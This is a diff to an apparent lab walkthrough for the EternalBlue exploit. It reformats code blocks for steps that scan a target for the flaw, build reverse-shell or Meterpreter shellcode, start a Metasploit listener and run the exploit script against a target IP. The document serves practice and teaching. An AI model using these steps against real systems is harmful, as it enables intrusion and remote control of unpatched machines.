@@ -13,7 +13,9 @@ Note: The --break-system-packages flag is required on newer Kali Linux versions 
 2. Vulnerability Scanning
 Verify the target status before exploitation.
 
-```python eternal_checker.py <TARGET_IP>```
+```
+python eternal_checker.py <TARGET_IP>
+```
 
 Status: If The target is not patched appears, the system is vulnerable.
 Ignore: SyntaxWarning: invalid escape sequence is a Python versioning quirk and doesn't affect the scan.
@@ -21,19 +23,25 @@ Ignore: SyntaxWarning: invalid escape sequence is a Python versioning quirk and 
 3. Shellcode Generation
 Create the payload for the target architecture.
 
-```cd shellcode```
-```sudo ./shell_prep.sh```
+```
+cd shellcode
+sudo ./shell_prep.sh
+```
 
 Inputs: Enter LHOST, LPORT, and choose between Meterpreter (0) or Regular Shell (1).
 
 4. Metasploit Listener Setup
 Prepare the handler to receive the reverse connection.
 
-```sudo ./listener_prep.sh```
+```
+sudo ./listener_prep.sh
+```
 
 5. Execution
 Run the exploit using the generated shellcode.
 
-```sudo python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_all.bin.```
+```
+sudo python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_all.bin.
+```
 
 And the blue machine crashing down
